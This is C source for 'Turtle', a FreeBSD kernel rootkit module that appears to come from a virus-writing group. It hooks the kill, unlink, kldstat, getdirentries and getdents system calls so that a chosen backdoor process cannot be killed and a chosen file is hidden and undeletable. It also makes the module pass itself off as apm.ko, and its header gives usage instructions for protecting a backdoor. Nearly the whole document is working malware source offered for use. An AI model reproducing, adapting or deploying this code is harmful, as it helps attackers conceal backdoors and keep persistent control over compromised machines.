/* Turtle rootkit for FreeBSD by WarGame/EOF - wargame89@yahoo.it */
/* http://vx.netlux.org/wargamevx - Tested on FreeBSD 7.2-RELEASE */

/******************************************************************
 How it works:
 - Hook unlink() so the protected file can't be deleted 
 - Hook kill() so the protected process can't be killed
 - Hook getdirentries() and getdents() so the protected 
   file doesn't appear in the directories listing
 - Hook kldstat() so the rootkit itself doesn't get discovered (it
   can be discovered in other ways)
 The pid and the file get passed to the module using kenv variables:
 Example (assume your are root):
 kenv turtle.pid=1456
 kenv turtle.file=my_backdoor
 kldload ./turtle.ko
 ******************************************************************/           

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/linker.h>
#include <sys/libkern.h>
#include <sys/dirent.h>

/* the name of the kenv variables could be changed to be less suspicious */
#define KENV_PID "turtle.pid" /* the pid of the process to protect */
#define KENV_FILE "turtle.file" /* the file to protect */
#define MOD_NAME "turtle.ko" /* this is the name of the binary */

static int pid = 0;
static char *file = NULL;

#define VERBOSE 1 /* enable/disable debug messages */
               
static int kill_hook(struct thread *td, struct kill_args *args)
{
	if(args->pid == pid)
	{
#if VERBOSE
		printf("Turtle: blocking kill()\n");
#endif
		return 0;
	}

	return kill(td,args);
}

static int unlink_hook(struct thread *td,struct unlink_args *args)
{
	if(strstr(args->path,file))
	{
#if VERBOSE
		printf("Turtle: blocking unlink()\n");
#endif
		return 0;
	}

	return unlink(td,args);
}

static int kldstat_hook(struct thread *td,struct kldstat_args *args) /* hide our module */
{
	int ret = kldstat(td,args);
	size_t fake_size = 24264; /* the size of apm.ko on my system */

	if(strcmp(args->stat->name,MOD_NAME) == 0)
	{
		copyout(&fake_size,&args->stat->size,sizeof(fake_size));
		copyout("apm.ko",args->stat->name,7);
#if VERBOSE
		printf("Turtle: blocking kldstat()\n");
#endif 
	}

	return ret;
}

static int getdirentries_hook(struct thread *td,struct getdirentries_args *args) 
{
	int size = 0,cnt,to_sub = 0;
	struct dirent *dir;
	char *tmp_buf = NULL;
	getdirentries(td, args);

	cnt = td->td_retval[0];

	if(cnt > 0)
	{
		MALLOC(dir,struct dirent *,sizeof(struct dirent),M_TEMP,M_NOWAIT);
		MALLOC(tmp_buf,char *,cnt,M_TEMP,M_NOWAIT);
	
		size = 0;	
		
		while(cnt > 0)
		{
			dir = (struct dirent *)(args->buf + size);  
			
			if(strstr(dir->d_name,file) == NULL)
			{
				bcopy((char *)dir,(char *)(tmp_buf+size-to_sub),dir->d_reclen);
			}

			else
			{
#if VERBOSE
				printf("Turtle: blocking getdirentries()\n");
#endif
				to_sub += dir->d_reclen;
			}
			
			size += dir->d_reclen;
			cnt -= dir->d_reclen;
		}

		/* done */
		copyout(tmp_buf,args->buf,td->td_retval[0]-to_sub);
		td->td_retval[0] = td->td_retval[0]-to_sub;
		
 		/* On my system freeing the used memory makes all crashes */
		/* FREE(tmp_buf,M_TEMP);		
		   FREE(dir,M_TEMP); */
	}

	return 0;
}

static int getdents_hook(struct thread *td,struct getdents_args *args) /* the same as getdirentries() */
{
	int size = 0,cnt,to_sub = 0;
	struct dirent *dir;
	char *tmp_buf = NULL;
	getdents(td, args);

	cnt = td->td_retval[0];

	if(cnt > 0)
	{
		MALLOC(dir,struct dirent *,sizeof(struct dirent),M_TEMP,M_NOWAIT);
		MALLOC(tmp_buf,char *,cnt,M_TEMP,M_NOWAIT);
	
		size = 0;	
		
		while(cnt > 0)
		{
			dir = (struct dirent *)(args->buf + size);  
			
			if(strstr(dir->d_name,file) == NULL)
			{
				bcopy((char *)dir,(char *)(tmp_buf+size-to_sub),dir->d_reclen);
			}

			else
			{
#if VERBOSE
				printf("Turtle: blocking getdents()\n");
#endif
				to_sub += dir->d_reclen;
			}
			
			size += dir->d_reclen;
			cnt -= dir->d_reclen;
		}

		/* done */
		copyout(tmp_buf,args->buf,td->td_retval[0]-to_sub);
		td->td_retval[0] = td->td_retval[0]-to_sub;
		
 		/* On my system freeing the used memory makes all crashes */
		/* FREE(tmp_buf,M_TEMP);		
		   FREE(dir,M_TEMP); */
	}

	return 0;
}



static int load(struct module *module, int cmd, void *arg)
{
        int error = 0;
	char *pid_s = getenv(KENV_PID);
	file = getenv(KENV_FILE);

	if(pid_s == NULL || file == NULL)
	{
		printf("Turtle: turtle.file or turtle.pid not set\n");
		return EINVAL;
	}

	pid = strtol(pid_s,NULL,10);
        
	switch (cmd) 
	{
		case MOD_LOAD:
#if VERBOSE
			printf("Turtle: loaded (pid=%d,file=%s) \n",pid,file);
#endif
			sysent[SYS_kill].sy_call = (sy_call_t *)kill_hook;
			sysent[SYS_unlink].sy_call = (sy_call_t *)unlink_hook;
			sysent[SYS_kldstat].sy_call = (sy_call_t *)kldstat_hook;
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
			sysent[SYS_getdents].sy_call = (sy_call_t *)getdents_hook;
                 	break;
        	
		case MOD_UNLOAD:
#if VERBOSE
			printf("Turtle: unloaded\n");
#endif
			sysent[SYS_kill].sy_call = (sy_call_t *)kill;
			sysent[SYS_unlink].sy_call = (sy_call_t *)unlink;
			sysent[SYS_kldstat].sy_call = (sy_call_t *)kldstat;
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries;
			sysent[SYS_getdents].sy_call = (sy_call_t *)getdents;
                 	break;
        	default:
                 	error = EINVAL;
                 	break;
        }
        
	return error;
}

static moduledata_t turtle_mod   = {
        "turtle",            
        load,                    
        NULL                     
};

DECLARE_MODULE(turtle, turtle_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
